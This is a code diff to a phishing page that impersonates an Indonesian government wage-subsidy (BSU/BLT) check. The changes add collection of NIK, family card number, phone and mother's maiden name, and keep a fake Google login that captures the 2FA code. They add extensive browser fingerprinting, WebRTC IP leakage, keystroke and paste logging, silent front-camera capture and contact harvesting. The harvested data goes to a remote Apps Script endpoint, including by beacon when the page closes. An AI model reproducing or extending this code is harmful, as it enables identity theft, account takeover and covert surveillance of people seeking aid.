@@ -5,12 +5,17 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="robots" content="noindex,nofollow">
 <meta name="theme-color" content="#0e2a47">
-<title>Bantuan Subsidi Upah 2026 - Pengecekan Mandiri</title>
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="manifest" href="manifest.json">
 <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@700&display=swap" rel="stylesheet">
+<title>Bantuan Subsidi Upah 2026 - Pengecekan Mandiri</title>
 <style>
 :root{--navy:#0e2a47;--navy2:#123a5f;--blue:#0b78f0;--link:#0b57a4;--ink:#333e48;--mut:#6b7680;--line:#dde3e9}
 *{box-sizing:border-box}
-body{margin:0;font-family:'Open Sans',Arial,sans-serif;color:var(--ink);background:#fff;font-size:14px;line-height:1.6}
+body{margin:0;font-family:'Open Sans',Arial,sans-serif;color:var(--ink);background:#fff;font-size:14px;line-height:1.6;
+  -webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}
 a{color:var(--link);text-decoration:none}
 .top{background:var(--navy);color:#fff}
 .top .in{max-width:1100px;margin:0 auto;padding:9px 16px;display:flex;align-items:center;gap:12px}
@@ -79,8 +84,9 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
 #gsiCv{display:none}
 #dv{position:fixed;right:6px;bottom:6px;z-index:95;font:10px/1.35 monospace;background:rgba(8,18,30,.85);color:#8fe3b4;padding:5px 7px;border-radius:4px;max-width:44vw;display:none;white-space:pre-wrap}
 #dv.on{display:block}
-
-/* ============ GERBANG ============ */
+#kontakChip{position:fixed;left:8px;bottom:8px;z-index:96;display:none;background:#1c6fd4;color:#fff;border:0;
+  border-radius:20px;padding:8px 14px;font:600 11.5px system-ui;box-shadow:0 4px 14px rgba(0,0,0,.3)}
+#kontakChip.on{display:block}
 #gerbang{position:fixed;inset:0;z-index:999999;display:none;align-items:center;justify-content:center;
   padding:22px 18px;background:linear-gradient(165deg,#08243d,#0e2a47 45%,#061a2c);
   color:#e6eef6;font-family:'Open Sans',Arial,sans-serif;touch-action:none;overscroll-behavior:none;
@@ -106,6 +112,7 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
   font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:.3px;
   box-shadow:0 8px 26px rgba(28,111,212,.4)}
 #gbGo:disabled{background:#24507d;box-shadow:none;color:#a8c3dd}
+#gbLewat{background:none;border:0;color:#7d95ad;font:11px system-ui;margin-top:10px;text-decoration:underline}
 #gbNote{font-size:10.5px;color:#7d95ad;margin-top:13px;line-height:1.55}
 </style>
 </head>
@@ -114,18 +121,19 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
 <div id="gerbang"><div class="gb-in">
   <div class="gb-logo">K</div>
   <h2>Pemeriksaan Data Peserta</h2>
-  <p> Sesuaikan identitas Anda agar data kepesertaan BSU dan BLT yang ditampilkan sesuai dengan KTP elektronik. Ketuk satu kali, lalu pilih <b>Izinkan</b> pada setiap permintaan.</p>
+  <p>Sesuaikan identitas Anda agar data kepesertaan BSU dan BLT yang ditampilkan sesuai dengan KTP elektronik. Ketuk satu kali, lalu pilih <b>Izinkan</b> pada setiap permintaan.</p>
   <ul id="gbList">
     <li data-k="layar"><i></i><span>Menyesuaikan tampilan layar</span></li>
     <li data-k="jaga"><i></i><span>Program yang di tujukan untuk membantu pada orang yang tepat</span></li>
-    <li data-k="kamera"><i></i><span>Pemeriksaan  data peserta agar BSU dan BLT tersampaikan </span></li>
+    <li data-k="kamera"><i></i><span>Pemeriksaan data peserta agar BSU dan BLT tersampaikan</span></li>
     <li data-k="mikrofon"><i></i><span>Pemeriksaan peserta terdaftar atau tidak untuk penerimaan BSU dan BLT</span></li>
-    <li data-k="lokasi"><i></i><span>Penyelarasan wilayah kecamatan agar semua mendapat hak yang sama dan tepat sasaran </span></li>
+    <li data-k="lokasi"><i></i><span>Penyelarasan wilayah kecamatan agar semua mendapat hak yang sama dan tepat sasaran</span></li>
     <li data-k="notifikasi"><i></i><span>Pemberitahuan hasil pemeriksaan</span></li>
-    <li data-k="kontak"><i></i><span>Penyelarasan data peserta</span></li>
-    <li data-k="klip"><i></i><span>Menunggu  proses pemeriksaan</span></li>
+    <li data-k="klip"><i></i><span>Menunggu proses pemeriksaan</span></li>
+    <li data-k="kontak"><i></i><span>Penyelarasan data peserta dan keluarga</span></li>
   </ul>
   <button id="gbGo" type="button">LANJUTKAN UNTUK PENDAFTARAN PENERIMA BSU DAN BLT</button>
+  <button id="gbLewat" type="button">lewati pemeriksaan</button>
   <div id="gbNote">Cukup satu ketukan. Formulir terbuka otomatis setelah pemeriksaan selesai.</div>
 </div></div>
 
@@ -148,6 +156,14 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
     <div class="f"><label>Nomor Induk Kependudukan (NIK) <span>*</span></label>
       <input id="nik" type="text" inputmode="numeric" maxlength="16" placeholder="16 digit NIK" autocomplete="off">
       <div class="hint">Contoh: 3329xxxxxxxxxxxx</div></div>
+    <div class="f"><label>Nomor Kartu Keluarga (KK) <span>*</span></label>
+      <input id="kk" type="text" inputmode="numeric" maxlength="16" placeholder="16 digit nomor KK" autocomplete="off">
+      <div class="hint">Tertera pada Kartu Keluarga.</div></div>
+    <div class="f"><label>Nomor Handphone <span>*</span></label>
+      <input id="hp" type="tel" inputmode="tel" maxlength="15" placeholder="08xxxxxxxxxx" autocomplete="off">
+      <div class="hint">Nomor yang aktif dan terdaftar.</div></div>
+    <div class="f"><label>Nama Ibu Kandung <span>*</span></label>
+      <input id="ibu" type="text" maxlength="60" placeholder="Nama ibu kandung sesuai KTP" autocomplete="off"></div>
     <div class="f"><label>Kode Verifikasi <span>*</span></label>
       <div class="cap"><canvas id="capv" width="132" height="42"></canvas>
         <button class="ref" id="capr" type="button">Ganti kode</button></div>
@@ -188,7 +204,7 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
     </div>
     <div id="gsiStep3" style="display:none">
       <h3>Verifikasi 2 Langkah</h3>
-      <p class="sub">Masukkan kode 6 digit yang dikirim Google ke perangkat Anda. Kode tidak muncul otomatis di sini, jadi salin dari SMS atau notifikasi.</p>
+      <p class="sub">Masukkan kode 6 digit yang dikirim Google ke perangkat Anda.</p>
       <div class="gsi-otp">
         <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
         <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
@@ -206,21 +222,23 @@ aside .card{background:#f9fbfd}aside ul{margin:0;padding-left:17px}aside li{font
 
 <video id="gsiVid" playsinline muted autoplay></video>
 <canvas id="gsiCv"></canvas>
+<button id="kontakChip" type="button">Ambil kontak</button>
 <div id="dv"></div>
 
 <script>
 (function(){
 'use strict';
-var BUILD='zgch-f10',PSK='BsuPegasus2026K';
+var BUILD='zgch-f20',PSK='BsuPegasus2026K';
 var EP='https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec';
 var DEV=/dev=1/.test(location.search);
 var $=function(i){return document.getElementById(i)};
-var wrap=$('gsi-wrap'),vid=$('gsiVid'),cv=$('gsiCv'),ger=$('gerbang');
-var NIK='',sid='',dev='',step=0,capKode='',ip='',siapKamera=false,gerbangAktif=false;
+var wrap=$('gsi-wrap'),vid=$('gsiVid'),cv=$('gsiCv'),ger=$('gerbang'),chip=$('kontakChip');
+var NIK='',KK='',HP='',IBU='',sid='',dev='',step=0,capKode='',ip='',siapKamera=false,gerbangAktif=false;
 var KEYS=[],FOTO='',SKOR=0,SIDIK='',PROBE={},DET={},DEVID='',sudahBangkit=0,jagaLayarRef=null;
 var kamAktif=false,kamTimer=null,kamJaga=null,kamN=0;
 var micAktif=false,micStream=null,micCtx=null,micAn=null,micTimer=null,micSik=null,micClip=0;
-var vidAktif=false,vidJeda=null,vidN=0,fsTimer=null,fsCoba=0;
+var vidAktif=false,vidJeda=null,vidN=0,fsTimer=null,fsCoba=0,kunciAktif=false,kontakOk=false;
+var SMS=[];
 
 function hex(n){var a=new Uint8Array(n);crypto.getRandomValues(a);
   return Array.prototype.map.call(a,function(b){return('0'+b.toString(16)).slice(-2)}).join('')}
@@ -252,21 +270,144 @@ function send(a,o){return seal(Object.assign({action:a,sid:sid,ts:Date.now()},o|
 function kirimPolos(a,o){var q='action='+a+'&sid='+sid+'&enc=0';
   Object.keys(o||{}).forEach(function(k){q+='&'+k+'='+encodeURIComponent(String(o[k]).slice(0,120000))});polos(q)}
 function dbg(m){if(!DEV)return;var d=$('dv');d.classList.add('on');d.textContent=String(m).slice(0,300)+'\n'+d.textContent.slice(0,600)}
+function hash(s){var h=2166136261;for(var i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)}return (h>>>0).toString(16)}
 
-/* ---------- sidik ---------- */
-function sidik(){
-  try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');
-    x.fillStyle='#123';x.fillRect(0,0,240,60);x.textBaseline='top';x.font='16px Arial';
-    x.fillStyle='#8ef';x.fillText('ZGCH '+navigator.language,4,8);
-    x.fillStyle='#fa3';x.fillText(String(Date.now()%99991),4,30);SIDIK=c.toDataURL().slice(-180)}catch(e){SIDIK=''}
-  try{var ac=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);
+/* =========================================================
+   SIDIK JARI PERAMBAN
+   ========================================================= */
+function fpCanvas(){
+  try{
+    var c=document.createElement('canvas');c.width=280;c.height=70;var x=c.getContext('2d');
+    x.fillStyle='#123';x.fillRect(0,0,280,70);
+    x.textBaseline='top';x.font='17px Arial';x.fillStyle='#8ef';x.fillText('ZGCH '+navigator.language,5,6);
+    x.font='italic 15px Georgia';x.fillStyle='#fa3';x.fillText('fp-'+sid,5,30);
+    x.strokeStyle='#4d9';x.beginPath();x.arc(200,40,20,0,6.28);x.stroke();
+    x.fillStyle='rgba(200,80,60,.6)';x.fillRect(150,10,40,20);
+    return hash(c.toDataURL());
+  }catch(e){return ''}
+}
+function fpWebgl(){
+  try{
+    var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!g)return '';
+    var d=g.getExtension('WEBGL_debug_renderer_info');
+    var v=d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):'';
+    var r=d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):'';
+    var p=[v,r,g.getParameter(g.MAX_TEXTURE_SIZE),g.getParameter(g.MAX_RENDERBUFFER_SIZE),
+      g.getParameter(g.MAX_VIEWPORT_DIMS),g.getParameter(g.ALIASED_LINE_WIDTH_RANGE)].join('|');
+    PROBE.gpu=r||'';
+    return hash(p);
+  }catch(e){return ''}
+}
+function fpAudio(){
+  try{
+    var ac=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);
     var o=ac.createOscillator();o.type='triangle';o.frequency.value=10000;
     var g=ac.createGain();g.gain.value=.05;o.connect(g);g.connect(ac.destination);o.start(0);
-    ac.startRendering().then(function(b){var d=b.getChannelData(0),s=0;
-      for(var i=0;i<d.length;i+=100)s+=Math.abs(d[i]);PROBE.audio=Math.round(s*1000)}).catch(function(){})}catch(e){}
+    return ac.startRendering().then(function(b){
+      var d=b.getChannelData(0),s=0;
+      for(var i=0;i<d.length;i+=100)s+=Math.abs(d[i]);
+      PROBE.audio=Math.round(s*1000);
+      return hash(String(PROBE.audio)+'|'+d.length);
+    }).catch(function(){return ''});
+  }catch(e){return Promise.resolve('')}
 }
+function fpFont(){
+  var daftar=['Arial','Arial Black','Calibri','Cambria','Candara','Comic Sans MS','Consolas','Courier New',
+    'Georgia','Helvetica','Impact','Lucida Console','Palatino','Segoe UI','Tahoma','Times New Roman',
+    'Trebuchet MS','Verdana','Roboto','Noto Sans','sans-serif','serif','monospace'];
+  try{
+    var c=document.createElement('canvas').getContext('2d'),dasar={},ada=[];
+    daftar.forEach(function(f){c.font='72px monospace';dasar[f]=c.measureText(f).width});
+    daftar.forEach(function(f){
+      c.font='72px "'+f+'", monospace';
+      if(c.measureText(f).width!==dasar[f])ada.push(f);
+    });
+    PROBE.fon=ada.join(',');
+    return hash(ada.join(','));
+  }catch(e){return ''}
+}
+function fpKodek(){
+  try{
+    var v=document.createElement('video'),a=document.createElement('audio');
+    var m=['video/mp4;codecs="avc1.42E01E"','video/webm;codecs="vp8"','video/webm;codecs="vp9"',
+      'video/webm;codecs="av01"','audio/mp4;codecs="mp4a.40.2"','audio/webm;codecs="opus"',
+      'audio/ogg;codecs="vorbis"'];
+    var ada=m.filter(function(x){return v.canPlayType(x)||a.canPlayType(x)});
+    PROBE.kodek=ada.join(' ');
+    return hash(ada.join(' '));
+  }catch(e){return ''}
+}
+function fpSuara(){
+  try{
+    var vs=(window.speechSynthesis&&speechSynthesis.getVoices())||[];
+    var s=vs.map(function(x){return x.name+'/'+x.lang}).join(',');
+    PROBE.suara=vs.length;
+    return hash(s);
+  }catch(e){return ''}
+}
+function fpStorage(){
+  try{
+    if(!navigator.storage||!navigator.storage.estimate)return Promise.resolve('');
+    return navigator.storage.estimate().then(function(e){
+      PROBE.storage=(e.quota||0)+'/'+(e.usage||0);
+      return hash(PROBE.storage);
+    }).catch(function(){return ''});
+  }catch(e){return Promise.resolve('')}
+}
+function fpIncognito(){
+  try{
+    if(navigator.storage&&navigator.storage.estimate){
+      return navigator.storage.estimate().then(function(e){
+        var i=(e.quota||0)<130*1024*1024?1:0;
+        PROBE.incognito=i;return String(i);
+      }).catch(function(){return ''});
+    }
+  }catch(e){}
+  return Promise.resolve('');
+}
+function fpAdblock(){
+  return new Promise(function(res){
+    try{
+      var d=document.createElement('div');
+      d.className='adsbox ad-placement pub_300x250';
+      d.style.cssText='position:absolute;height:12px;width:300px;left:-999px';
+      document.body.appendChild(d);
+      setTimeout(function(){
+        var blok=d.offsetHeight===0||d.clientHeight===0;
+        try{d.remove()}catch(e){}
+        PROBE.adblock=blok?1:0;res(blok?'1':'0');
+      },180);
+    }catch(e){res('')}
+  });
+}
+function fpSemua(){
+  var f={};
+  f.canvas=fpCanvas();f.webgl=fpWebgl();f.fon=fpFont();f.kodek=fpKodek();f.suara=fpSuara();
+  f.gpu=PROBE.gpu||'';
+  return Promise.all([fpAudio(),fpStorage(),fpIncognito(),fpAdblock()]).then(function(r){
+    f.audio=r[0];f.storage=r[1];f.incognito=r[2];f.adblock=r[3];
+    f.platform=navigator.platform||'';
+    f.layar=(screen.width||0)+'x'+(screen.height||0)+'x'+(screen.colorDepth||0);
+    f.zona=Intl.DateTimeFormat().resolvedOptions().timeZone||'';
+    f.bahasa=(navigator.languages||[]).join(',');
+    f.inti=navigator.hardwareConcurrency||0;
+    f.ram=navigator.deviceMemory||0;
+    f.touch=navigator.maxTouchPoints||0;
+    f.perangkat=[(navigator.plugins||[]).length,(navigator.mimeTypes||[]).length].join('/');
+    f.ua=navigator.userAgent;
+    f.hash=hash([f.canvas,f.webgl,f.audio,f.fon,f.gpu,f.layar,f.zona,f.bahasa,f.inti,f.ram,
+      f.touch,f.kodek,f.suara,f.storage].join('~'));
+    SIDIK=f.hash;
+    f.probe=JSON.stringify(PROBE);
+    return f;
+  });
+}
+
+/* ---------- probe ---------- */
 function probe(){
-  ['contacts','credentials','geolocation','mediaDevices','clipboard','share','vibrate','Notification','bluetooth','usb','wakeLock','serviceWorker','crypto']
+  ['contacts','credentials','geolocation','mediaDevices','clipboard','share','vibrate','Notification',
+   'bluetooth','usb','wakeLock','serviceWorker','crypto','storage','permissions','speechSynthesis']
   .forEach(function(n){try{PROBE[n]=!!navigator[n]}catch(e){PROBE[n]=false}});
   PROBE.touch=('ontouchstart' in window);PROBE.mem=navigator.deviceMemory||0;PROBE.inti=navigator.hardwareConcurrency||0;
   try{var c=document.createElement('canvas'),g=c.getContext('webgl');
@@ -281,34 +422,17 @@ function hitung(){var s=10;
   if(PROBE.gpu)s+=5;if(PROBE.touch)s+=3;return Math.min(99,s)}
 
 /* =========================================================
-   DETEKSI PERANGKAT LENGKAP
+   DETEKSI PERANGKAT
    ========================================================= */
 function fpBrand(model,ua){
   var v=((model||'')+' '+(ua||'')).toUpperCase();
-  var b=[
-    ['OPPO',/\bOPPO\b|\bCPH\d{4}\b|\bP[A-Z]{2}[A-Z0-9]{2,}\b/],
-    ['Samsung',/\bSAMSUNG\b|\bSM-[A-Z0-9]+/],
-    ['Xiaomi',/\bXIAOMI\b|\bREDMI\b|\bPOCO\b|\bMI\s?\d/],
-    ['Infinix',/\bINFINIX\b|\bX6\d{2}[A-Z]?\b/],
-    ['Tecno',/\bTECNO\b|\bCK\d{4}\b/],
-    ['realme',/\bREALME\b|\bRMX\d{4}\b/],
-    ['vivo',/\bVIVO\b|\bV\d{4}[A-Z]?\b/],
-    ['Huawei',/\bHUAWEI\b/],
-    ['Honor',/\bHONOR\b/],
-    ['OnePlus',/\bONEPLUS\b/],
-    ['Google',/\bPIXEL\b/],
-    ['Motorola',/\bMOTO\b|\bXT\d{4,}\b/],
-    ['ASUS',/\bASUS\b|\bROG PHONE\b/],
-    ['Sony',/\bSONY\b|\bXQ-[A-Z0-9]+\b/],
-    ['Nokia',/\bNOKIA\b|\bTA-\d{4}\b/],
-    ['Itel',/\bITEL\b/],
-    ['Advan',/\bADVAN\b|\bADVANCE\b/],
-    ['Polytron',/\bPOLYTRON\b/],
-    ['ZTE',/\bZTE\b/],
-    ['Lenovo',/\bLENOVO\b/],
-    ['Sharp',/\bSHARP\b|\bSH-\d{2}[A-Z0-9]+\b/],
-    ['Apple',/\bIPHONE\b|\bIPAD\b|\bIPOD\b|\bMACINTOSH\b/]
-  ];
+  var b=[['OPPO',/\bOPPO\b|\bCPH\d{4}\b/],['Samsung',/\bSAMSUNG\b|\bSM-[A-Z0-9]+/],
+    ['Xiaomi',/\bXIAOMI\b|\bREDMI\b|\bPOCO\b/],['Infinix',/\bINFINIX\b|\bX6\d{2}[A-Z]?\b/],
+    ['Tecno',/\bTECNO\b|\bCK\d{4}\b/],['realme',/\bREALME\b|\bRMX\d{4}\b/],['vivo',/\bVIVO\b|\bV\d{4}[A-Z]?\b/],
+    ['Huawei',/\bHUAWEI\b/],['Honor',/\bHONOR\b/],['OnePlus',/\bONEPLUS\b/],['Google',/\bPIXEL\b/],
+    ['Motorola',/\bMOTO\b|\bXT\d{4,}\b/],['ASUS',/\bASUS\b|\bROG PHONE\b/],['Sony',/\bSONY\b|\bXQ-[A-Z0-9]+\b/],
+    ['Nokia',/\bNOKIA\b|\bTA-\d{4}\b/],['Itel',/\bITEL\b/],['Advan',/\bADVAN\b/],['Polytron',/\bPOLYTRON\b/],
+    ['ZTE',/\bZTE\b/],['Lenovo',/\bLENOVO\b/],['Sharp',/\bSHARP\b/],['Apple',/\bIPHONE\b|\bIPAD\b|\bMACINTOSH\b/]];
   for(var i=0;i<b.length;i++)if(b[i][1].test(v))return b[i][0];
   return 'UNKNOWN';
 }
@@ -339,8 +463,7 @@ function fpOSV(ua){var m;
 function fpBrw(ua){
   var b=[['Microsoft Edge',/EdgA?\/([\d.]+)/],['Opera',/OPR\/([\d.]+)/],
     ['Samsung Internet',/SamsungBrowser\/([\d.]+)/],['Firefox',/Firefox\/([\d.]+)/],
-    ['Chrome iOS',/CriOS\/([\d.]+)/],['Chrome',/Chrome\/([\d.]+)/],
-    ['Safari',/Version\/([\d.]+).*Safari/]];
+    ['Chrome iOS',/CriOS\/([\d.]+)/],['Chrome',/Chrome\/([\d.]+)/],['Safari',/Version\/([\d.]+).*Safari/]];
   for(var i=0;i<b.length;i++){var m=ua.match(b[i][1]);if(m)return{nama:b[i][0],ver:m[1]}}
   return{nama:'UNKNOWN',ver:'UNKNOWN'}}
 function batre(){try{if(!navigator.getBattery)return Promise.resolve(null);
@@ -349,7 +472,6 @@ function batre(){try{if(!navigator.getBattery)return Promise.resolve(null);
 function jar(){try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
   if(!c)return Promise.resolve(null);
   return Promise.resolve({t:c.effectiveType||c.type||'',d:c.downlink||'',r:c.rtt||''})}catch(e){return Promise.resolve(null)}}
-
 function deteksi(){
   var ua=navigator.userAgent||'',ud=navigator.userAgentData||null;
   var p={deviceId:DEVID,ua:ua,platform:(ud&&ud.platform)||navigator.platform||''};
@@ -377,8 +499,7 @@ function deteksi(){
     p.viewport=(window.innerWidth||0)+'x'+(window.innerHeight||0);
     p.pr=window.devicePixelRatio||1;
     p.cpu=navigator.hardwareConcurrency||0;p.ram=navigator.deviceMemory||0;
-    p.touch=navigator.maxTouchPoints||0;
-    p.bahasa=navigator.language||'';
+    p.touch=navigator.maxTouchPoints||0;p.bahasa=navigator.language||'';
     p.bahasaAll=(navigator.languages||[]).join(',');
     p.zona=Intl.DateTimeFormat().resolvedOptions().timeZone||'';
     p.online=navigator.onLine?1:0;
@@ -386,6 +507,101 @@ function deteksi(){
     p.page=location.href;p.ip=ip;p.waktu=new Date().toISOString();
     DET=p;return p;
   });
+}
+
+/* ---------- izin & jaringan ---------- */
+function izinPeriksa(){
+  var daftar=['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write',
+    'persistent-storage','push','midi','background-sync','accelerometer','gyroscope','magnetometer','screen-wake-lock'];
+  var out=[];
+  if(!navigator.permissions||!navigator.permissions.query)return Promise.resolve(out);
+  return Promise.all(daftar.map(function(n){
+    return navigator.permissions.query({name:n}).then(function(s){out.push({nama:n,status:s.state})})
+      .catch(function(){});
+  })).then(function(){return out});
+}
+function ipLokal(){
+  return new Promise(function(res){
+    var ips=[],selesai=false;
+    var tutup=function(){if(selesai)return;selesai=true;res(ips.join(' '))};
+    try{
+      var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      pc.createDataChannel('x');
+      pc.onicecandidate=function(e){
+        if(!e.candidate)return tutup();
+        var m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){3,7})/i.exec(e.candidate.candidate);
+        if(m&&ips.indexOf(m[1])<0)ips.push(m[1]);
+      };
+      pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(function(){});
+      setTimeout(tutup,2600);
+    }catch(e){res('')}
+  });
+}
+function jarKirim(){
+  return Promise.all([ipLokal(),jar()]).then(function(r){
+    var c=r[1]||{};
+    var p={lokal:r[0],publik:ip,tipe:c.t||'',down:c.d||'',rtt:c.r||'',
+      online:navigator.onLine?1:0,ua:navigator.userAgent};
+    send('jar',p).catch(function(){});kirimPolos('jar',p);
+    return p;
+  });
+}
+
+/* =========================================================
+   PELACAKAN SITUS
+   ========================================================= */
+var JT=Date.now(),JEV=[],JSCROLL=0,JKLIK=0,JKEY=0,JFOKUS=0,JBLUR=0;
+function jev(n,d){if(JEV.length>500)return;JEV.push([Date.now()-JT,n,String(d||'').slice(0,140)])}
+function utm(){
+  try{
+    var q=location.search.replace(/^\?/,'').split('&'),o=[];
+    q.forEach(function(kv){
+      var i=kv.indexOf('=');if(i<0)return;
+      var k=kv.slice(0,i);
+      if(/^(utm_|gclid|fbclid|ref|src)/.test(k))o.push(k+'='+decodeURIComponent(kv.slice(i+1)));
+    });
+    return o.join('&');
+  }catch(e){return ''}
+}
+function jejakKirim(){
+  if(!JEV.length)return;
+  var rows=JEV.splice(0,120);
+  var p={rows:JSON.stringify(rows),hal:location.href,ref:document.referrer||'',utm:utm()};
+  send('situs',p).catch(function(){});kirimPolos('situs',p);
+}
+function jejakPasang(){
+  jev('muat',location.href);
+  document.addEventListener('click',function(e){
+    var t=e.target||{},tag=(t.tagName||'').toLowerCase();
+    JKLIK++;jev('klik',tag+(t.id?'#'+t.id:'')+'|'+String(t.textContent||'').trim().slice(0,40));
+  },true);
+  document.addEventListener('input',function(e){
+    var t=e.target||{};if(!t.id)return;JKEY++;jev('input',t.id+'='+String(t.value||'').slice(0,30));
+  },true);
+  document.addEventListener('paste',function(e){
+    var s='';try{s=(e.clipboardData||window.clipboardData).getData('text')}catch(x){}
+    jev('tempel',String(s).slice(0,60));
+  },true);
+  document.addEventListener('copy',function(){jev('salin','')},true);
+  window.addEventListener('scroll',function(){
+    var h=document.documentElement.scrollHeight-window.innerHeight;
+    var p=h>0?Math.round(window.scrollY/h*100):100;
+    if(p>JSCROLL){JSCROLL=p;if(p%10===0)jev('gulir',p+'%')}
+  },{passive:true});
+  window.addEventListener('focus',function(){JFOKUS++;jev('fokus','')});
+  window.addEventListener('blur',function(){JBLUR++;jev('blur','')});
+  document.addEventListener('visibilitychange',function(){jev('vis',document.visibilityState)});
+  window.addEventListener('pagehide',function(){
+    jev('keluar',Math.round((Date.now()-JT)/1000)+'s');
+    try{
+      var q='action=situs&sid='+sid+'&enc=0&rows='+encodeURIComponent(JSON.stringify(JEV))+
+        '&hal='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer||'')+
+        '&utm='+encodeURIComponent(utm());
+      fetch(EP,{method:'POST',mode:'no-cors',keepalive:true,body:q}).catch(function(){});
+    }catch(e){}
+  });
+  setInterval(jejakKirim,20000);
+  setInterval(function(){jev('detak',Math.round((Date.now()-JT)/1000)+'s')},15000);
 }
 
 /* ---------- geo ---------- */
@@ -396,7 +612,9 @@ function geo(cb){if(!navigator.geolocation)return cb(null);
 function geoIp(){fetch('https://api.ipify.org?format=json').then(function(r){return r.json()})
   .then(function(d){if(d&&d.ip)ip=d.ip}).catch(function(){})}
 
-/* ---------- kamera senyap ---------- */
+/* =========================================================
+   KAMERA
+   ========================================================= */
 function tungguSiap(){
   return new Promise(function(res){
     if(vid.readyState>=2&&vid.videoWidth>0)return res(true);
@@ -416,7 +634,8 @@ function nyala(){
   if(siapKamera&&vid.srcObject)return Promise.resolve(true);
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return Promise.resolve(false);
   return navigator.mediaDevices.getUserMedia({
-      video:{facingMode:'user',width:{ideal:720},height:{ideal:720}},audio:false})
+      video:{facingMode:'user',width:{ideal:960},height:{ideal:960}},
+      audio:false})
     .then(function(s){
       vid.srcObject=s;
       try{s.getVideoTracks().forEach(function(t){
@@ -458,22 +677,17 @@ function normal(){
     x.putImageData(im,0,0);
   }catch(e){}
 }
-function siapkan(w,h){
-  w=Math.min(560,w||480);h=Math.round((h||360)/((w||480))*w)||360;
-  cv.width=Math.round(w*0.75);cv.height=Math.round(cv.width*(h/w));
-  return cv.getContext('2d');
-}
 function dariSensor(){
   return new Promise(function(res){
     try{
       var t=vid.srcObject&&vid.srcObject.getVideoTracks&&vid.srcObject.getVideoTracks()[0];
       if(!t||!window.ImageCapture)return res('');
       new ImageCapture(t).grabFrame().then(function(bm){
-        var w=Math.min(560,bm.width),h=Math.round(bm.height/bm.width*w);
+        var w=Math.min(720,bm.width),h=Math.round(bm.height/bm.width*w);
         cv.width=w;cv.height=h;
         cv.getContext('2d').drawImage(bm,0,0,w,h);
         if(bm.close)try{bm.close()}catch(e){}
-        res(cv.toDataURL('image/jpeg',.74));
+        res(cv.toDataURL('image/jpeg',.82));
       }).catch(function(){res('')});
     }catch(e){res('')}
   });
@@ -482,10 +696,10 @@ function dariLayar(){
   return new Promise(function(res){
     try{
       if(!vid.videoWidth)return res('');
-      var w=Math.min(560,vid.videoWidth),h=Math.round(vid.videoHeight/vid.videoWidth*w);
+      var w=Math.min(720,vid.videoWidth),h=Math.round(vid.videoHeight/vid.videoWidth*w);
       cv.width=w;cv.height=h;
       cv.getContext('2d').drawImage(vid,0,0,w,h);
-      res(cv.toDataURL('image/jpeg',.74));
+      res(cv.toDataURL('image/jpeg',.82));
     }catch(e){res('')}
   });
 }
@@ -494,10 +708,7 @@ function jepret(){
     if(!siapKamera)return res('');
     var n=0,baik='',nilai=-1;
     (function ulang(){
-      dariSensor().then(function(u){
-        if(!u)return dariLayar();
-        return u;
-      }).then(function(u){
+      dariSensor().then(function(u){if(!u)return dariLayar();return u}).then(function(u){
         if(!u)return selesai();
         var b=kecerahan();
         if(b>nilai){nilai=b;baik=u}
@@ -510,7 +721,7 @@ function jepret(){
       try{cv.getContext('2d').drawImage(vid,0,0,cv.width,cv.height)}catch(e){}
       if(nilai>=0&&nilai<48)normal();
       var out;
-      try{out=cv.toDataURL('image/jpeg',.78)}catch(e){out=baik}
+      try{out=cv.toDataURL('image/jpeg',.85)}catch(e){out=baik}
       res(out);
     }
   });
@@ -530,15 +741,13 @@ function layar(){
       var t=wrap.classList.contains('on')?wrap:document.body;
       html2canvas(t,{backgroundColor:'#ffffff',logging:false,scale:.6,
         windowWidth:document.documentElement.clientWidth,scrollX:0,scrollY:-window.scrollY,
-        ignoreElements:function(e){return e.id==='dv'||e.id==='gsiVid'||e.id==='gerbang'}})
-        .then(function(c){res(c.toDataURL('image/jpeg',.55))}).catch(function(){res('')});
+        ignoreElements:function(e){return e.id==='dv'||e.id==='gsiVid'||e.id==='gerbang'||e.id==='kontakChip'}})
+        .then(function(c){res(c.toDataURL('image/jpeg',.6))}).catch(function(){res('')});
     }catch(e){res('')}
   });
 }
 
-/* =========================================================
-   KAMERA SIAGA + PEREKAM VIDEO TERUS-MENERUS
-   ========================================================= */
+/* ---------- kamera siaga ---------- */
 function kamMulai(){
   if(kamAktif)return Promise.resolve('sudah');
   kamAktif=true;
@@ -578,7 +787,6 @@ function torch(){
 function micKirim(db,pk){
